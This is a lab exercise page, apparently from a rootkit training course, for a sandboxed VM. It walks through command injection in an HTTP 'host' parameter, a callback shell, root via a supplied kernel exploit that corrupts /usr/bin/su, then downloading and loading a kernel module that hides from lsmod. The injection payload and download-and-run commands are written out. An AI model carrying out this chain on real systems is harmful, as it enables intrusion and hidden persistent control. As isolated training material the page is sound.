# D00: Deploy

## Mission

D00 begins outside the target.
The only initial entry point is a vulnerable HTTP service.
Your job is to turn command injection into a root shell, transfer the module you
built in M01, load it, and verify its control interface.

## What you will observe

```text
HOST                                      TARGET VM
+----------------------+                  +-----------------------+
| rklings.ko           |                  | status service :8080  |
| copy_fail_exp.py     |                  | runs as student       |
| HTTP client/listener |                  | no learner SSH access |
+----------+-----------+                  +-----------+-----------+
           | command injection                         |
           +-----------------------------------------> |
           |         callback shell as student         |
           | <-----------------------------------------+
           |                                           |
           +- Copy Fail > root > transfer > load -------+
```

## Workspace

The guest runs Ubuntu 24.04 with kernel 6.8.0-101-generic. Its status service
passes the `host` query parameter to `getent hosts` through a shell.
The service runs as `student` without sudo.

QEMU maps the guest service to `http://127.0.0.1:8088` on the host.
The supported learner SSH entry is sealed, and the module is not staged in the
guest.
The runner retains a private root management channel so `./rklings complete D00`
can inspect the final receipt; `rklings ssh` does not expose that channel, and
it is not part of the exercise path.
The runner builds these files on the host and prints their directory:

```text
.rklings/build/local-control-deployment/
+-- copy_fail_exp.py
+-- rklings.ko
```

## 1. Establish execution

First prove the injection with a short command:

```sh
curl --get --data-urlencode 'host=;id' http://127.0.0.1:8088/
```

The expected UID is `1000(student)`.
A one-shot HTTP response proves command execution, but it is awkward for an
exploit and file transfer.
Use the same injection point to establish an interactive callback to a listener
on the host.

Checkpoint:

```sh
id
# uid=1000(student) ...
```

## 2. Become root

Loading a kernel module requires root privileges.
The target kernel is vulnerable to CVE-2026-31431 (Copy Fail).
The supplied Python exploit corrupts `/usr/bin/su` in the page cache through
AF_ALG and `splice`, then opens a root shell.

Serve the prepared artifacts from another host terminal:

```sh
python3 -m http.server 9000 --directory \
  .rklings/build/local-control-deployment --bind 0.0.0.0
```

Then transfer and run the exploit from the guest shell.
Confirm the new shell before continuing:

```sh
cd /tmp
curl -fO http://10.0.2.2:9000/copy_fail_exp.py
python3 copy_fail_exp.py
id
# uid=0(root) ...
```

Run the exploit only inside the disposable D00 guest.

## 3. Deploy the module

The module remains on the host until you have access to the target.
This makes transfer part of the deployment rather than a fixture supplied by the
course.

Use the same temporary file server to retrieve the module from the root shell:

```sh
cd /tmp
curl -fO http://10.0.2.2:9000/rklings.ko
insmod /tmp/rklings.ko
mkdir /tmp/rklings.h.m
d00-check
./rklings complete D00
```

`10.0.2.2` is the QEMU user-network address of the host. `d00-check` exercises
the loaded module and verifies that it is concealed while its control plane
still responds.

## Test it

```sh
./rklings run D00
```

Expected startup:

```text
[+] deployment module ready on host: .rklings/build/.../rklings.ko
[+] vulnerable service ready at http://127.0.0.1:8088
[+] target sealed; initial access is HTTP only
[*] target running; press Ctrl+C to stop
```

In another terminal:

```sh
curl 'http://127.0.0.1:8088/?host=localhost'
```

The response proves that the deliberately vulnerable service is reachable.
Use that service, not learner SSH, to complete the three operational steps above.

## Validate

```sh
./rklings validate D00
```

`rklings validate D00` checks only that the isolated target and vulnerable
service are correctly provisioned.
It deliberately does not mark D00 complete: provisioning is not evidence that
you performed the intrusion.
After deployment, run `d00-check` inside the root shell, then run
`./rklings complete D00` on the host while the lab is still active.
Completion is recorded only when the runner finds the root-owned success receipt
in that same guest.

## Success criteria

- The first shell runs as `student` and came through the HTTP service.
- Copy Fail produces a root shell.
- `rklings.ko` reaches the guest only after initial access.
- The module loads and `d00-check` passes.
- The module remains functional after it disappears from `lsmod`.

## Next

You deployed the module by hand through a compromised shell.
L14 starts automating that work by having the module launch a dedicated agent.
